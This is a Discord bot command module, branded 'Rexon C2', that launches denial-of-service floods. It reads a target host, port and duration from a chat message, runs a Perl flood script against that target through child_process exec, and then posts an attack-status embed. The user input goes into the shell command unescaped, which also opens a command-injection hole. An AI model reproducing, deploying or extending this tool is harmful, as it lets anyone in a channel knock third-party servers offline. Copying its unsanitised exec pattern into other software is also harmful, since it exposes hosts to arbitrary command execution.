const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const duration = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Example : !home 1.1.1.1 80 60`")
	.setFooter("Please do not attack government server")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`perl home.pl ${host} ${port} 65500 ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('WHITE')
	.setTitle('🚀 **Rexon C2** 🚀')
	.setTimestamp()
  .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 👨` \n **𝓣𝓪𝓻𝓰𝓮𝓽** : `" + host + "` \n **𝓟𝓸𝓻𝓽** : `" + port + "` \n **𝓜𝓮𝓽𝓱𝓸𝓭** : `HOME 💣` \n **𝓣𝓲𝓶𝓮** : `" + duration + "`")
	.setFooter('© Developer: Senz', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media.giphy.com/media/l4KhQo2MESJkc6QbS/giphy.gif", "https://media.giphy.com/media/jzHFPlw89eTqU/giphy.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **ZER0 BOT** 🚀')
	.setTimestamp()
	.setDescription("**► 𝓟𝓵𝓮𝓪𝓼𝓮 𝔀𝓪𝓲𝓽 𝓯𝓸𝓻 𝓿𝓮𝓻𝓲𝓯𝓲𝓬𝓪𝓽𝓲𝓸𝓷 **")
	.setFooter('© Developer: Senz', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['home'],
  permLevel: 0
}

exports.help = {
  name: 'home',
  description: 'zxcr9999',
  usage: 'home'
}
